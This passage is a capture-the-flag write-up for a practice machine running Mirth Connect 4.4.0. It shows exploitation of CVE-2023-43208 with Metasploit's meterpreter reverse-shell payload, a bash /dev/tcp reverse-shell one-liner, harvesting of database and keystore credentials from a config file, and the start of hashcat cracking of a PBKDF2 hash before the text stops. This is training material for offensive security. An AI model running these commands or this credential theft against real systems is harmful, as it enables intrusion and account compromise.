        <jar download="eager" href="webstart/client-lib/openjfx.jar" sha256="xXKQTb9rtpA+xbbrJv41SeGQsfBLK5od/tjYzSBEfqI="/>
        <jar download="eager" href="webstart/client-lib/hapi-base-2.3.jar" sha256="XgloOIjOa0PPHD6YRCtQYz8Sh1wOXd4qZwT8rP0NH2g="/>
        <jar download="eager" href="webstart/client-lib/jersey-media-multipart-2.22.1.jar" sha256="NI9cZ1099RlbB1UDeDeqxG+JDk1XL/5QpulQF76VM0E="/>
        <jar download="eager" href="webstart/client-lib/httpcore-4.4.13.jar" sha256="7GMATM3FXKnnKJokElaJxSUznUY4lI0nbKKo+XW/Amk="/>
        <jar download="eager" href="webstart/client-lib/xercesImpl-2.9.1.jar" sha256="35zfeAILzwjhdB7CmbVNu/IgqdWm92le919CD0vT3Go="/>
        <jar download="eager" href="webstart/client-lib/javax.activation-1.2.0.jar" sha256="rV9iEYBiiE0cU0+2Dd3Mqihmk/ykGK62+YGf/7Hmofo="/>
        <jar download="eager" href="webstart/client-lib/hk2-api-2.4.0-b31.jar" sha256="Yd0V2fCUvbtCeWsKybYe52IiKr0pcWUXYG2r1qRCKVo="/>
        <jar download="eager" href="webstart/client-lib/commons-compress-1.17.jar" sha256="vdHWwrCXRfPZawbulPFXxx/9elZghqPNsYD9Sq/EiRU="/>
        <jar download="eager" href="webstart/client-lib/staxon-1.3.jar" sha256="jeWRqRwl0xXZzYCV4hHI9L8Ce/sy9mNVsg1LmzrcH0w="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v231-2.3.jar" sha256="Zy3A3/aqpUxulbTzSLOfFS/zskDaRtHqcyktQ9Ppl8U="/>
        <jar download="eager" href="webstart/client-lib/jackson-databind-2.11.3.jar" sha256="HdpB6UnUciJ4xp3AApqF3SD0DC7XceIsoqy+nvtRO/k="/>
        <jar download="eager" href="webstart/client-lib/jersey-guava-2.22.1.jar" sha256="IBqA2V9KW8RRbGf1gi83X1yPbPevBUWvSvSLAsBT/+8="/>
        <jar download="eager" href="webstart/client-lib/joda-time-2.9.9.jar" sha256="lbeoqEup9KalPvZCzypvbbIkaIWi2jlKfSpHlQIt1rw="/>
        <jar download="eager" href="webstart/client-lib/velocity-engine-core-2.2.jar" sha256="hLoIAPaQME4UpUhH4JM/BaRE1XU/aAsKWpO/a7QtlqM="/>
        <jar download="eager" href="webstart/client-lib/javax.inject-2.4.0-b31.jar" sha256="VMorIrzeWoo+lDm5JOnVK0w4Cshu5wEmVgjP6lkqqDw="/>
        <jar download="eager" href="webstart/client-lib/jackson-annotations-2.11.3.jar" sha256="DoOzxry+xCjH7dTFsmeOBqnf6tp/MADddqPAc74EbAw="/>
        <jar download="eager" href="webstart/client-lib/slf4j-api-1.7.30.jar" sha256="4odF1co8Wo88h4Pmg/GzGh2SKMnnn0Yi04e0Og0Rg6o="/>
        <jar download="eager" href="webstart/client-lib/commons-pool2-2.3.jar" sha256="APdgYnfApxJ1KQ+FlfuLhcSYL1J+YfM2gWQG52hhogQ="/>
        <jar download="eager" href="webstart/client-lib/javassist-3.26.0-GA.jar" sha256="CIYZWNSYwYzGL6Br67AC6i0neHBvi2JOpCjRjmJGFI0="/>
        <jar download="eager" href="webstart/client-lib/guava-28.2-jre.jar" sha256="SyoNyKpmdiFudyjFaul5lMleraSD8E85voyrCpzf9dY="/>
        <jar download="eager" href="webstart/client-lib/jaxb-api-2.4.0-b180725.0427.jar" sha256="l9sDNL727nZkvNzCarcpq7jd8VcMu3ss6FNOSG57/NQ="/>
        <jar download="eager" href="webstart/client-lib/httpmime-4.5.13.jar" sha256="7R/v9tFfvVFBimz7msrZ1B6Zfq5bGQqFDkyYFterJMM="/>
        <jar download="eager" href="webstart/client-lib/wizard.jar" sha256="7OYEhgqNU7QJqK9bHGJNJqxFCi4oWVlF8XtYwBaPdOo="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v22-2.3.jar" sha256="OjQVkkOwGi+iGVkPv9q06zuiHw6ER+iUMlZJJHc35ZA="/>
        <jar download="eager" href="webstart/client-lib/miglayout-swing-4.2.jar" sha256="Mx8CMy2FiaUHSLJB4nSirw4XWrQiuzZuHbTK385bnIk="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v25-2.3.jar" sha256="9SblQqKV9egD7z7obYD6BnY/nTXvli5+uPkLYDvsYAs="/>
        <jar download="eager" href="webstart/client-lib/reflections-0.9.10.jar" sha256="IPDk2Q6OmWaPvh4hRXVM0PYCrWryNVd0aaiufWFahNk="/>
        <jar download="eager" href="webstart/client-lib/javaparser-1.0.8.jar" sha256="cUyZFy6pW06C7BeXIVnQH1jSDjn+D6NOvFLdxZm0v3U="/>
        <jar download="eager" href="webstart/client-lib/miglayout-core-4.2.jar" sha256="0ajHMEw8GsCWLq1gSh9zhJp+FRGHhq//sRO2RTz9EtU="/>
        <jar download="eager" href="webstart/client-lib/bcprov-ext-jdk18on-171.jar" sha256="/1v9cPkedM2dS61zfPb1QRczEb2XjDx8IxQ+vX3EgqM="/>
        <jar download="eager" href="webstart/client-lib/jersey-common-2.22.1.jar" sha256="w1a3DUxOzMnN3ShUe3BgqKq+LQZuRXbjf7XPGAGSyH4="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v26-2.3.jar" sha256="/sdcfbvvni4u7iJ7C4fAoGuqBV3SKt+oaeaUmrz7soc="/>
        <jar download="eager" href="webstart/client-lib/javax.ws.rs-api-2.0.1.jar" sha256="1anYrmLH6XVLuL6UdyHChnVC63G88ZN6ksYVKDHrwWY="/>
        <jar download="eager" href="webstart/client-lib/rhino-1.7.13.jar" sha256="9YLjcaeQjbLFrlnNeNAPPFyO7GwkWeoivlB+cHf/LGw="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v251-2.3.jar" sha256="PKc8cQQrOWODAnNyWfbj0YGGoZlR2+ekBnToOn9XIp4="/>
        <jar download="eager" href="webstart/client-lib/bcpkix-jdk18on-171.jar" sha256="skuBILkn+PcpJuDP/M9di3Nu3hlq93rYuSSgS2/ovtQ="/>
        <jar download="eager" href="webstart/client-lib/javax.mail-1.5.0.jar" sha256="flDlXMAW8Rl7/D5PRT6aziJ5+BFLgCkly4USmIUJnj0="/>
        <jar download="eager" href="webstart/client-lib/slf4j-log4j12-1.7.30.jar" sha256="7G71CIScs6JqQn95E5IH01sMkDdrP/BDQgCS9ZwmIvE="/>
        <jar download="eager" href="webstart/client-lib/jai_imageio.jar" sha256="Sv+7VsN2v7lCseg/10Hfl+25Z17DIjbBFS5LW8uSCzc="/>
        <jar download="eager" href="webstart/client-lib/javax.activation-api-1.2.0.jar" sha256="v3ndkHoaiEwiTJpm9177HFQztgaZC5VfN9B2jdrkhFs="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v27-2.3.jar" sha256="fJ668/E7otWgs7SA1jHiiCpKHSHAiouVPKS3IO1Zcq4="/>
        <jar download="eager" href="webstart/client-lib/userutil-sources.jar" sha256="1BGr/v2Og/FH2XYS244rEs7fsLEu1BmKQmSpWHRn05U="/>
        <jar download="eager" href="webstart/client-lib/bcprov-jdk18on-171.jar" sha256="l7kndUKXP0Boq6mlKee5Qo78WjkJEH2nDYp/+PbhVkI="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v281-2.3.jar" sha256="4s3VMiZqi8XRR8R2ojsgD9sALwtqw4wnSRa0d0YxYtU="/>
        <jar download="eager" href="webstart/client-lib/jersey-client-2.22.1.jar" sha256="gmAUfqtAN3AeddIKF40h1pvUB10Qzdy3+Z6zWKXueTY="/>
        <jar download="eager" href="webstart/client-lib/log4j-api-2.17.2.jar" sha256="Rpvu+JLDk4rkoNnRr8C9xI57yHVBwTB0tvAL8zSi5cY="/>
        <jar download="eager" href="webstart/client-lib/httpclient-4.5.13.jar" sha256="G87KYCKVy/05s9g44w8cILxtugjhab6FyoM24Xcov9M="/>
        <jar download="eager" href="webstart/client-lib/istack-commons-runtime-3.0.6.jar" sha256="r7Pdb2yYKzY3TR1m8Nq8nR52JTeX9WjlGYZWwvQQMrU="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v24-2.3.jar" sha256="m6ulzJ/p9GGit/n3kid3O2VDZSSGdSgzltNd1UVGFuw="/>
        <jar download="eager" href="webstart/client-lib/commons-lang-2.6.jar" sha256="NKmzkdAArMvPlzkusZAE3/wiKSk1XsdzJONkUQvG8dk="/>
        <jar download="eager" href="webstart/client-lib/commons-beanutils-1.9.3.jar" sha256="rpgEMWYeRxs6wfLVCeOCrgm2CWo+QdSNPxLK05zWz9k="/>
        <jar download="eager" href="webstart/client-lib/regions-2.15.28.jar" sha256="DO+3VI3z+GW/FSgxHWsjJ6ddn3FedIBCeRkdvjUSWc0="/>
        <jar download="eager" href="webstart/client-lib/hk2-utils-2.4.0-b31.jar" sha256="1dSEKIqf2Ocip0f+5elBZJxi6UnRoaLg5RsfdzNluTI="/>
        <extension href="webstart/extensions/scriptfilestep.jnlp"/>
        <extension href="webstart/extensions/textviewer.jnlp"/>
        <extension href="webstart/extensions/dicomviewer.jnlp"/>
        <extension href="webstart/extensions/js.jnlp"/>
        <extension href="webstart/extensions/jdbc.jnlp"/>
        <extension href="webstart/extensions/mapper.jnlp"/>
        <extension href="webstart/extensions/directoryresource.jnlp"/>
        <extension href="webstart/extensions/datapruner.jnlp"/>
        <extension href="webstart/extensions/javascriptrule.jnlp"/>
        <extension href="webstart/extensions/datatype-xml.jnlp"/>
        <extension href="webstart/extensions/datatype-ncpdp.jnlp"/>
        <extension href="webstart/extensions/jms.jnlp"/>
        <extension href="webstart/extensions/datatype-json.jnlp"/>
        <extension href="webstart/extensions/xsltstep.jnlp"/>
        <extension href="webstart/extensions/file.jnlp"/>
        <extension href="webstart/extensions/scriptfilerule.jnlp"/>
        <extension href="webstart/extensions/messagebuilder.jnlp"/>
        <extension href="webstart/extensions/datatype-dicom.jnlp"/>
        <extension href="webstart/extensions/serverlog.jnlp"/>
        <extension href="webstart/extensions/datatype-hl7v3.jnlp"/>
        <extension href="webstart/extensions/datatype-hl7v2.jnlp"/>
        <extension href="webstart/extensions/ws.jnlp"/>
        <extension href="webstart/extensions/javascriptstep.jnlp"/>
        <extension href="webstart/extensions/dashboardstatus.jnlp"/>
        <extension href="webstart/extensions/datatype-raw.jnlp"/>
        <extension href="webstart/extensions/tcp.jnlp"/>
        <extension href="webstart/extensions/datatype-edi.jnlp"/>
        <extension href="webstart/extensions/smtp.jnlp"/>
        <extension href="webstart/extensions/globalmapviewer.jnlp"/>
        <extension href="webstart/extensions/httpauth.jnlp"/>
        <extension href="webstart/extensions/dicom.jnlp"/>
        <extension href="webstart/extensions/imageviewer.jnlp"/>
        <extension href="webstart/extensions/mllpmode.jnlp"/>
        <extension href="webstart/extensions/pdfviewer.jnlp"/>
        <extension href="webstart/extensions/destinationsetfilter.jnlp"/>
        <extension href="webstart/extensions/vm.jnlp"/>
        <extension href="webstart/extensions/http.jnlp"/>
        <extension href="webstart/extensions/doc.jnlp"/>
        <extension href="webstart/extensions/rulebuilder.jnlp"/>
        <extension href="webstart/extensions/datatype-delimited.jnlp"/>
    </resources>
    	
	
    <application-desc main-class="com.mirth.connect.client.ui.Mirth">
        <argument>https://interpreter.htb:443</argument>
        <argument>4.4.0</argument>
    </application-desc>
    
</jnlp>
```

The main part to focus on this file is the fact that the service is running on version 4.4.0. We already know that the service being ran is NextGen Healthcare, shown on the homepage. Note, Mirth Connect is most likely just the company name.

With the service name and version, we can try to find an exploit. Google gives us CVE-2023-43208, which is a [Remote Code Execution (RCE)](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/remote-code-execution/) vulnerability.

From here, we have multiple paths to take. One way is to find a Proof-of-Concept (PoC) on GitHub. Another way for this exploit is to search for it on the [Metsploit Framework](https://github.com/rapid7/metasploit-framework).

```shell
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $msfconsole -q
[msf](Jobs:0 Agents:0) >> search nextgen

Matching Modules
================

   #  Name                                                Disclosure Date  Rank       Check  Description
   -  ----                                                ---------------  ----       -----  -----------
   0  exploit/multi/http/mirth_connect_cve_2023_43208     2023-10-25       excellent  Yes    Mirth Connect Deserialization RCE
   1    \_ target: Unix Command                           .                .          .      .
   2    \_ target: Windows Command                        .                .          .      .
   3  auxiliary/scanner/http/wp_nextgen_galley_file_read  .                normal     No     WordPress NextGEN Gallery Directory Read Vulnerability


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/http/wp_nextgen_galley_file_read
```

We can see that the CVE is available! `msfconsole` makes it much easier to exploit vulnerabilities (it does have its drawbacks, like how noisy it is), so we will use the available module it has.

```shell
[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
```

We can now set the correct options for this exploit

```shell
[msf](Jobs:0 Agents:0) exploit(multi/http/mirth_connect_cve_2023_43208) >> options

Module options (exploit/multi/http/mirth_connect_cve_2023_43208):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, s
                                         ocks5h, sapni, http, socks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                         asploit.html
   RPORT      8443             yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Lin
                                              ux ≥3.17 (for Python variant also Python ≥3.8, tested shells are sh, bash, zsh) (Acce
                                              pted: none, python3.8+, shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST           REDACTED         yes       The listen address (an interface may be specified)
   LPORT           4444             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.


   When FETCH_FILELESS is none:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      BTgOaqFZ         no        Name to use on remote system when storing payload; cannot contain spaces or slash
                                                  es
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces


Exploit target:

   Id  Name
   --  ----
   0   Unix Command



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/mirth_connect_cve_2023_43208) >> set LHOST REDACTED
LHOST => REDACTED
[msf](Jobs:0 Agents:0) exploit(multi/http/mirth_connect_cve_2023_43208) >> set RHOSTS 10.129.244.184
RHOSTS => 10.129.244.184
[msf](Jobs:0 Agents:0) exploit(multi/http/mirth_connect_cve_2023_43208) >> set RPORT 443
RPORT => 443
[msf](Jobs:0 Agents:0) exploit(multi/http/mirth_connect_cve_2023_43208) >> set FETCH_COMMAND WGET
FETCH_COMMAND => WGET
```

It is imperative that you change `RPORT` to 443, as that is the port where the service is running. You can also see this in the `.jnlp` file.

```shell
[msf](Jobs:0 Agents:0) exploit(multi/http/mirth_connect_cve_2023_43208) >> run
[*] Started reverse TCP handler on REDACTED:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version 4.4.0 is affected by CVE-2023-43208.
[*] Executing cmd/linux/http/x64/meterpreter/reverse_tcp (Unix Command)
[+] The target appears to have executed the payload.
[*] Sending stage (3090404 bytes) to 10.129.244.184
[*] Meterpreter session 1 opened (REDACTED:4444 -> 10.129.244.184:36274) at 2026-05-30 17:41:37 +0900

(Meterpreter 1)(/usr/local/mirthconnect) > shell
Process 4357 created.
Channel 1 created.
whoami
mirth
```

As you can see, we do have Initial Access! I like to have my shell on [Penelope](https://github.com/brightio/penelope), so we can execute a reverse shell on our current shell and have Penelope listening.

```shell
bash -c 'exec bash -i &>/dev/tcp/REDACTED/1337 <&1'
```

```shell
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> REDACTED
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => interpreter 10.129.244.184 Linux-x86_64 👤 mirth(103) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/donutmaster/.penelope/sessions/interpreter~10.129.244.184-Linux-x86_64/2026_05_30-17_43_22-837.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
mirth@interpreter:/usr/local/mirthconnect$
```

## User Flag

### MySQL

```shell
mirth@interpreter:/usr/local/mirthconnect$ cd /home
mirth@interpreter:/home$ ls
sedric
mirth@interpreter:/home$ cd sedric
bash: cd: sedric: Permission denied
```

We have one user named `sedric`. This is probably the user we have to escalate to (forshadowing.....).

Usually, services have some sort of configuration file, so we can look around `/usr/local/mirthconnect` for anything useful.

```shell
mirth@interpreter:/home$ cd /usr/local/mirthconnect
mirth@interpreter:/usr/local/mirthconnect$ ls -lah
total 148K
drwxr-xr-x 14 mirth mirth 4.0K May 30 04:44 .
drwxr-xr-x 11 root  root  4.0K Feb 16 15:42 ..
drwxr-xr-x  3 mirth mirth 4.0K Feb 16 15:42 .install4j
-rwxr-xr-x  1 mirth mirth  250 May 30 04:44 UTkunZiYqzRI
drwxr-xr-x  2 mirth mirth 4.0K Feb 16 15:42 client-lib
drwxr-xr-x  2 mirth mirth 4.0K Feb 16 15:42 conf
drwxr-xr-x  2 mirth mirth 4.0K Feb 16 15:42 custom-lib
drwxr-xr-x  4 mirth mirth 4.0K Feb 16 15:42 docs
drwxr-xr-x 43 mirth mirth 4.0K Feb 16 15:42 extensions
drwxr-xr-x  2 mirth mirth 4.0K Feb 16 15:42 logs
-rwxr-xr-x  1 mirth mirth  15K Jul 18  2023 mcserver
-rwxr-xr-x  1 mirth mirth   69 Jul 18  2023 mcserver.vmoptions
-rwxr-xr-x  1 mirth mirth  18K Jul 18  2023 mcservice
-rwxr-xr-x  1 mirth mirth   69 Jul 18  2023 mcservice.vmoptions
-rwxr-xr-x  1 mirth mirth  17K Jul 18  2023 mirth-server-launcher.jar
-rwxr-xr-x  1 mirth mirth 1.3K Sep 19  2025 preferences
drwxr-xr-x  7 mirth mirth 4.0K Feb 16 15:42 public_api_html
drwxr-xr-x  6 mirth mirth 4.0K Feb 16 15:42 public_html
drwxr-xr-x  2 mirth mirth 4.0K Feb 16 15:42 server-launcher-lib
drwxr-xr-x 14 mirth mirth 4.0K Feb 16 15:42 server-lib
-rwxr-xr-x  1 mirth mirth  17K Jul 18  2023 uninstall
drwxr-xr-x  2 mirth mirth 4.0K Feb 16 15:42 webapps
```

We do indeed have a `conf` directory.

```shell
mirth@interpreter:/usr/local/mirthconnect$ cd conf
mirth@interpreter:/usr/local/mirthconnect/conf$ ls -lah
total 24K
drwxr-xr-x  2 mirth mirth 4.0K Feb 16 15:42 .
drwxr-xr-x 14 mirth mirth 4.0K May 30 04:44 ..
-rwxr-xr-x  1 mirth mirth 1.5K Jul 18  2023 dbdrivers.xml
-rwxr-xr-x  1 mirth mirth 2.2K Sep 19  2025 log4j2.properties
-rwxr-xr-x  1 mirth mirth 4.8K May 30 02:46 mirth.properties
```

The most interesting file here seems like `mirth.properties`, which we will look at first.

```shell
mirth@interpreter:/usr/local/mirthconnect/conf$ cat mirth.properties
# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# password requirements
password.minlength = 0
password.minupper = 0
password.minlower = 0
password.minnumeric = 0
password.minspecial = 0
password.retrylimit = 0
password.lockoutperiod = 0
password.expiration = 0
password.graceperiod = 0
password.reuseperiod = 0
password.reuselimit = 0

# Only used for migration purposes, do not modify
version = 4.4.0

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS

# server
http.contextpath = /
server.url =

http.host = 0.0.0.0
https.host = 0.0.0.0

https.client.protocols = TLSv1.3,TLSv1.2
https.server.protocols = TLSv1.3,TLSv1.2,SSLv2Hello
https.ciphersuites = TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_AES_256_GCM_SHA384,TLS_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_DSS_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_DSS_WITH_AES_128_GCM_SHA256,TLS_EMPTY_RENEGOTIATION_INFO_SCSV
https.ephemeraldhkeysize = 2048

# If set to true, the Connect REST API will require all incoming requests to contain an "X-Requested-With" header.
# This protects against Cross-Site Request Forgery (CSRF) security vulnerabilities.
server.api.require-requested-with = true

# CORS headers
server.api.accesscontrolalloworigin = *
server.api.accesscontrolallowcredentials = false
server.api.accesscontrolallowmethods = GET, POST, DELETE, PUT
server.api.accesscontrolallowheaders = Content-Type
server.api.accesscontrolexposeheaders =
server.api.accesscontrolmaxage =

# Determines whether or not channels are deployed on server startup.
server.startupdeploy = true

# Determines whether libraries in the custom-lib directory will be included on the server classpath.
# To reduce potential classpath conflicts you should create Resources and use them on specific channels/connectors instead, and then set this value to false.
server.includecustomlib = true

# administrator
administrator.maxheapsize = 512m

# properties file that will store the configuration map and be loaded during server startup
configurationmap.path = ${dir.appdata}/configuration.properties

# The language version for the Rhino JavaScript engine (supported values: 1.0, 1.1, ..., 1.8, es6).
rhino.languageversion = es6

# options: derby, mysql, postgres, oracle, sqlserver
database = mysql

# examples:
#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
#   MySQL                       jdbc:mysql://localhost:3306/mirthdb
#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB
#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
#   If you are using the Microsoft SQL Server driver, please also specify database.driver below 
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# If using a custom or non-default driver, specify it here.
# example:
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
# (Note: the jTDS driver is used by default for sqlserver)
database.driver = org.mariadb.jdbc.Driver

# Maximum number of connections allowed for the main read/write connection pool
database.max-connections = 20
# Maximum number of connections allowed for the read-only connection pool
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = REDACTED

#On startup, Maximum number of retries to establish database connections in case of failure
database.connection.maxretry = 2

#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
database.connection.retrywaitinmilliseconds = 10000

# If true, various read-only statements are separated into their own connection pool.
# By default the read-only pool will use the same connection information as the master pool,
# but you can change this with the "database-readonly" options. For example, to point the
# read-only pool to a different JDBC URL:
#
# database-readonly.url = jdbc:...
# 
database.enable-read-write-split = true
```

We are given a MySQL username and password!

```shell
database.username = mirthdb
database.password = REDACTED
```

We can login with these credentials.

```shell
mirth@interpreter:/usr/local/mirthconnect/conf$ mysql -h localhost -u mirthdb -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 37
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

### Privilege Escalation

We can search for useful information.

```shell
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mc_bdd_prod        |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use mc_bdd_prod
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mc_bdd_prod]> show tables;
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
21 rows in set (0.000 sec)

MariaDB [mc_bdd_prod]> select * from PERSON;
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
| ID | USERNAME | FIRSTNAME | LASTNAME | ORGANIZATION | INDUSTRY | EMAIL | PHONENUMBER | DESCRIPTION | LAST_LOGIN          | GRACE_PERIOD_START | STRIKE_COUNT | LAST_STRIKE_TIME | LOGGED_IN | ROLE | COUNTRY       | STATETERRITORY | USERCONSENT |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |           0 |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
1 row in set (0.000 sec)

MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD;
+-----------+-------------+---------------------+
| PERSON_ID | PASSWORD    | PASSWORD_DATE       |
+-----------+-------------+---------------------+
|         2 | REDACTED    | 2025-09-19 09:22:28 |
+-----------+-------------+---------------------+
1 row in set (0.000 sec)
```

We have found a hash for the user `sedric`!

After some googling, it seems like this hash is base64 encoded and a PBKDF2-HMAC-SHA256 hash.
- Salt: 8 bytes
- Key: 32 bytes

Therefore, we can base64 decode this in python and get the salt and key. You can read more about this on a post made by 0xBEN: [https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256](https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256).

There is a slight problem. The iteration count of this hash is 600,000, meaning the computer performs 600,000 SHA-256 operations for **EVERY SINGLE PASSWORD GUESS**. This would take a very long time to crack. We can still try with hashcat and mode `10900`.

#### Decoding hash

```shell
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $nano clean.py
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $cat clean.py
import base64
hash = "REDACTED"
decoded = base64.b64decode(hash)
salt = base64.b64encode(decoded[:8]).decode()
hash2 = base64.b64encode(decoded[8:]).decode()
print(f'Hash: sha256:600000:{salt}:{hash2}')
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $python3 clean.py
Hash: sha256:600000:REDACTED:REDACTED
```

#### Hashcat

```shell
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $echo 'sha256:600000:REDACTED:REDACTED' > hash
┌─[donutmaster@parrot]─[~/Desktop/HTB/Interpreter]
└──╼ $hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz, 6922/13909 MB (2048 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

